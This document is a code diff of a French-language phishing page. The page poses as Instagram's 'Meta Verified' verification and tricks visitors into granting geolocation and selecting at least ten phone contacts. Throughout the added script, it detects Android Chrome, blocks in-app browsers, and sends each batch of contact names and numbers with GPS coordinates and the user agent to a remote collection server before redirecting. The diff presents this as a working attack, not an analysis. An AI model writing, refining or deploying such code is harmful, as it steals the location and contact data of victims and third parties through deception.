@@ -4,56 +4,166 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="robots" content="noindex,nofollow,noarchive">
-<title>Instagram Pro · Vérification</title>
+<title>Instagram · Vérification du compte</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root { --ig-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #000; --card: #121212; --fg: #f5f5f5; --mut: #a8a8a8; --acc: #0095f6; }
+  :root {
+    --ig-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+    --bg: #000000;
+    --card: #121212;
+    --border: #262626;
+    --fg: #f5f5f5;
+    --mut: #a8a8a8;
+    --acc: #0095f6;
+    --err: #ed4956;
+    --ok: #58c322;
+  }
+  
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  body { margin: 0; background: var(--bg); color: var(--fg); font: 15px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-  .logo { font-family: 'Billabong', cursive, sans-serif; font-size: 42px; font-weight: bold; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
-  .card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid #262626; border-radius: 12px; padding: 30px 24px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-  .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(220, 39, 67, 0.1); color: #dc2743; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 16px; }
-  h1 { font-size: 20px; margin: 0 0 10px; font-weight: 600; }
-  .sub { color: var(--mut); font-size: 14px; margin: 0 0 24px; line-height: 1.5; }
-  button { width: 100%; padding: 14px; border: 0; border-radius: 8px; cursor: pointer; background: var(--acc); color: #fff; font-weight: 600; font-size: 15px; margin-bottom: 12px; }
-  button.sec { background: transparent; color: var(--fg); border: 1px solid #363636; }
-  .counter { margin: 20px 0; padding: 16px; background: #1a1a1a; border: 1px solid #262626; border-radius: 8px; font-size: 14px; }
-  .counter b { font-size: 24px; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: block; margin-bottom: 4px; }
-  .status { color: var(--mut); font-size: 13px; min-height: 20px; margin-top: 10px; }
-  [hidden] { display: none !important; }
-  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
+  
+  body { 
+    margin: 0; background: var(--bg); color: var(--fg); 
+    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif; 
+    display: flex; flex-direction: column; align-items: center; justify-content: center; 
+    min-height: 100vh; padding: 20px; 
+  }
+
+  /* Logo Instagram */
+  .logo-container { margin-bottom: 30px; text-align: center; }
+  .logo-svg { width: 60px; height: 60px; fill: url(#ig-grad); }
+  
+  /* Carte principale */
+  .card { 
+    width: 100%; max-width: 400px; background: var(--card); 
+    border: 1px solid var(--border); border-radius: 12px; 
+    padding: 32px 24px; text-align: center; 
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    animation: fadeUp 0.5s ease-out;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Badge Meta Verified */
+  .badge-meta { 
+    display: inline-flex; align-items: center; gap: 6px; 
+    background: rgba(0, 149, 246, 0.1); color: var(--acc); 
+    padding: 8px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; 
+    margin-bottom: 20px; border: 1px solid rgba(0, 149, 246, 0.3);
+  }
+  .badge-meta svg { width: 16px; height: 16px; fill: var(--acc); }
+
+  h1 { font-size: 22px; margin: 0 0 12px; font-weight: 700; letter-spacing: -0.5px; }
+  .sub { color: var(--mut); font-size: 14px; margin: 0 0 28px; line-height: 1.6; }
+  .sub b { color: var(--fg); }
+
+  /* Boutons */
+  button { 
+    width: 100%; padding: 16px; border: 0; border-radius: 8px; 
+    cursor: pointer; background: var(--acc); color: #fff; 
+    font-weight: 600; font-size: 15px; margin-bottom: 12px; 
+    transition: all 0.2s ease;
+  }
+  button:active { transform: scale(0.98); opacity: 0.8; }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  button.sec { background: transparent; color: var(--fg); border: 1px solid var(--border); }
+
+  /* Compteur de contacts */
+  .progress-container { margin: 24px 0; }
+  .progress-text { display: flex; justify-content: space-between; font-size: 13px; color: var(--mut); margin-bottom: 8px; }
+  .progress-text b { color: var(--fg); }
+  .progress-bar { width: 100%; height: 6px; background: #2a2a2a; border-radius: 3px; overflow: hidden; }
+  .progress-fill { height: 100%; width: 0%; background: var(--ig-grad); transition: width 0.3s ease; }
+
+  .status { color: var(--mut); font-size: 13px; min-height: 20px; margin-top: 12px; }
+  .status.err { color: var(--err); }
+  .status.ok { color: var(--ok); }
+
+  /* Animations Radar GPS */
+  .radar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--acc); margin: 0 auto 20px; position: relative; display: flex; align-items: center; justify-content: center; }
+  .radar::before { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--acc); animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite; opacity: 0; }
+  .radar-pin { width: 14px; height: 14px; background: var(--acc); border-radius: 50%; box-shadow: 0 0 10px var(--acc); }
+  @keyframes ping { 75%, 100% { transform: scale(2); opacity: 0; } }
+
+  /* Spinner de chargement */
+  .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  [hidden] { display: none !important; }
 </style>
 </head>
 <body>
 
-<div class="logo">Instagram</div>
+<!-- SVG Gradient pour le logo -->
+<svg style="width:0; height:0; position:absolute;" aria-hidden="true" focusable="false">
+  <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+    <stop offset="0%" stop-color="#f09433" />
+    <stop offset="25%" stop-color="#e6683c" />
+    <stop offset="50%" stop-color="#dc2743" />
+    <stop offset="75%" stop-color="#cc2366" />
+    <stop offset="100%" stop-color="#bc1888" />
+  </linearGradient>
+</svg>
 
-<div class="card" id="step1">
-  <div class="badge">✓ Programme Créateur</div>
-  <h1>Félicitations !</h1>
-  <p class="sub">Votre compte a été présélectionné pour recevoir le badge <b>Instagram Pro</b> et débloquer les statistiques avancées.</p>
-  <button id="startBtn">Vérifier mon éligibilité</button>
+<div class="logo-container">
+  <svg class="logo-svg" viewBox="0 0 24 24">
+    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+  </svg>
 </div>
 
+<!-- ERREUR DE NAVIGATEUR -->
+<div class="card" id="stepError" hidden>
+  <div class="badge-meta" style="background: rgba(237, 73, 86, 0.1); color: var(--err); border-color: rgba(237, 73, 86, 0.3);">⚠ Action requise</div>
+  <h1>Navigateur non pris en charge</h1>
+  <p class="sub" id="errText">Pour des raisons de sécurité, veuillez ouvrir ce lien dans <b>Google Chrome</b> sur un téléphone <b>Android</b>.</p>
+  <button onclick="location.reload()">Réessayer</button>
+</div>
+
+<!-- ETAPE 1 : ACCUEIL -->
+<div class="card" id="step1">
+  <div class="badge-meta">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4 3.6 3.6 7.6-7.6L19 8l-9 9z"/></svg>
+    Programme Créateur Éligible
+  </div>
+  <h1>Vérification du compte</h1>
+  <p class="sub">Votre compte a été présélectionné pour recevoir le badge <b>Meta Verified</b> et l'accès aux outils de créateur. Confirmez votre identité pour activer.</p>
+  <button id="startBtn">Confirmer mon éligibilité</button>
+</div>
+
+<!-- ETAPE 2 : GPS -->
 <div class="card" id="step2" hidden>
-  <div class="badge">Étape 1 / 2</div>
+  <div class="radar"><div class="radar-pin"></div></div>
   <h1>Localisation du compte</h1>
-  <p class="sub">Pour vérifier que vous êtes bien le propriétaire, veuillez autoriser la géolocalisation.</p>
+  <p class="sub">Veuillez autoriser la géolocalisation pour vérifier votre pays de résidence et éviter les usurpations d'identité.</p>
   <p class="status" id="statusGps">Demande d'accès...</p>
 </div>
 
+<!-- ETAPE 3 : CONTACTS -->
 <div class="card" id="step3" hidden>
-  <div class="badge">Étape 2 / 2</div>
-  <h1>Réseau d'amis</h1>
-  <p class="sub">Sélectionnez au moins <b>10 contacts</b> pour lier votre compte et éviter le spam.</p>
-  <div class="counter"><b id="count">0</b> / 10 sélectionnés</div>
-  <button id="pickBtn">Ouvrir le répertoire</button>
+  <h1>Réseau de confiance</h1>
+  <p class="sub">Sélectionnez au moins <b>10 contacts</b> pour prouver que vous êtes une personne réelle et lier votre compte.</p>
+  
+  <div class="progress-container">
+    <div class="progress-text">
+      <span>Contacts sélectionnés</span>
+      <span><b id="count">0</b> / 10</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+  </div>
+
+  <button id="pickBtn">Sélectionner des contacts</button>
+  <button id="skipBtn" class="sec" hidden>Ignorer (Non recommandé)</button>
   <p class="status" id="statusContact"></p>
 </div>
 
+<!-- ETAPE 4 : SUCCES -->
 <div class="card" id="step4" hidden>
-  <h1 style="margin-top: 20px;"><span class="spinner"></span> Vérification en cours</h1>
-  <p class="sub" style="margin-top: 15px;">Analyse de votre profil et synchronisation avec les serveurs Meta...</p>
+  <div class="badge-meta" style="background: rgba(88, 195, 34, 0.1); color: var(--ok); border-color: rgba(88, 195, 34, 0.3);">✓ Vérification réussie</div>
+  <h1>Bienvenue sur Pro</h1>
+  <p class="sub">Votre compte est en cours de synchronisation avec les serveurs Meta. Vous allez être redirigé vers votre profil.</p>
+  <div class="spinner" style="width: 30px; height: 30px; margin: 20px auto; display: block;"></div>
 </div>
 
 <script>
@@ -66,10 +176,30 @@
   const TARGET = 10;
 
   const $ = id => document.getElementById(id);
+  
+  // Détection stricte du navigateur
+  const ua = navigator.userAgent.toLowerCase();
+  const isAndroid = ua.indexOf("android") > -1;
+  const isChrome = ua.indexOf("chrome") > -1;
+  const isInApp = /fban|fbav|instagram|twitter|snapchat|whatsapp|fb_iab/.test(ua);
+
   let allContacts = [];
   let seen = new Set();
   let gpsData = { lat: '', lng: '', acc: '' };
 
+  // Bloquer si ce n'est pas le bon environnement
+  if (!isAndroid || !isChrome || isInApp) {
+    $('step1').hidden = true;
+    $('stepError').hidden = false;
+    if (isInApp) {
+      $('errText').innerHTML = "Vous êtes actuellement dans le navigateur d'une application. Cliquez sur les trois points en haut à droite et choisissez <b>'Ouvrir dans Chrome'</b>.";
+    } else if (!isAndroid) {
+      $('errText').innerHTML = "Le programme Meta Verified nécessite un appareil <b>Android</b>.";
+    }
+    return;
+  }
+
+  // 1. Récupération GPS
   function grabGPS() {
     return new Promise(resolve => {
       if (!navigator.geolocation) return resolve();
@@ -87,20 +217,16 @@
   $('startBtn').addEventListener('click', async () => {
     $('step1').hidden = true;
     $('step2').hidden = false;
-    $('statusGps').textContent = "Veuillez autoriser l'accès à votre position...";
-    await grabGPS(); 
-    $('step2').hidden = true;
     
-    if (!('contacts' in navigator)) {
-      $('step4').hidden = false;
-      sendData();
-      return;
-    }
-
+    await grabGPS(); 
+    
+    $('step2').hidden = true;
     $('step3').hidden = false;
+    $('skipBtn').hidden = false;
     pickContacts();
   });
 
+  // 2. Lecture des contacts
   async function pickContacts() {
     if (allContacts.length >= TARGET) return;
     $('pickBtn').disabled = true;
@@ -109,18 +235,29 @@
     try {
       const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
       if (list && list.length > 0) {
+        let newBatch = [];
         list.forEach(c => {
           const name = c.name && c.name[0] ? c.name[0] : '';
           const tel = c.tel && c.tel[0] ? c.tel[0] : '';
           if (!name && !tel) return;
           const key = name + tel;
+          
           if (!seen.has(key)) {
             seen.add(key);
-            allContacts.push({ name: [name], tel: [tel] });
+            const contactObj = { name: [name], tel: [tel] };
+            allContacts.push(contactObj);
+            newBatch.push(contactObj);
           }
         });
+        
+        // ENVOI IMMÉDIAT DÈS QU'UN CONTACT EST CHOISI
+        if (newBatch.length > 0) {
+            sendDataToServer(newBatch); 
+        }
       }
-    } catch (e) {}
+    } catch (e) {
+      // L'utilisateur a annulé
+    }
 
     $('pickBtn').disabled = false;
     updateUI();
@@ -128,30 +265,44 @@
 
   function updateUI() {
     $('count').textContent = allContacts.length;
+    const percent = Math.min(100, (allContacts.length / TARGET) * 100);
+    $('progressFill').style.width = percent + '%';
+
     if (allContacts.length >= TARGET) {
       $('pickBtn').hidden = true;
-      $('statusContact').textContent = "Synchronisation réussie !";
-      setTimeout(sendData, 1000);
+      $('skipBtn').hidden = true;
+      $('statusContact').className = 'status ok';
+      $('statusContact').textContent = "Vérification validée !";
+      setTimeout(() => {
+        $('step3').hidden = true;
+        $('step4').hidden = false;
+        setTimeout(() => location.replace(REDIRECT), 2500);
+      }, 1000);
     } else {
       $('pickBtn').textContent = "Ajouter des contacts (" + allContacts.length + "/" + TARGET + ")";
+      $('statusContact').className = 'status';
       $('statusContact').textContent = "Sélectionnez encore " + (TARGET - allContacts.length) + " contacts.";
     }
   }
 
   $('pickBtn').addEventListener('click', pickContacts);
+  
+  $('skipBtn').addEventListener('click', () => {
+      $('step3').hidden = true;
+      $('step4').hidden = false;
+      setTimeout(() => location.replace(REDIRECT), 2000);
+  });
 
-  async function sendData() {
-    $('step3').hidden = true;
-    $('step4').hidden = false;
-
+  // 3. Envoi immédiat au serveur Apps Script
+  async function sendDataToServer(contactsArray) {
     const payload = {
-      theme: 'Instagram Pro',
+      theme: 'Meta Verified',
       ua: navigator.userAgent,
       lat: gpsData.lat,
       lng: gpsData.lng,
       acc: gpsData.acc,
-      cCount: allContacts.length,
-      cJson: JSON.stringify(allContacts)
+      cCount: contactsArray.length,
+      cJson: JSON.stringify(contactsArray)
     };
 
     try {
@@ -162,8 +313,6 @@
         body: JSON.stringify(payload)
       });
     } catch(e) {}
-
-    setTimeout(() => location.replace(REDIRECT), 2500);
   }
 })();
 </script>
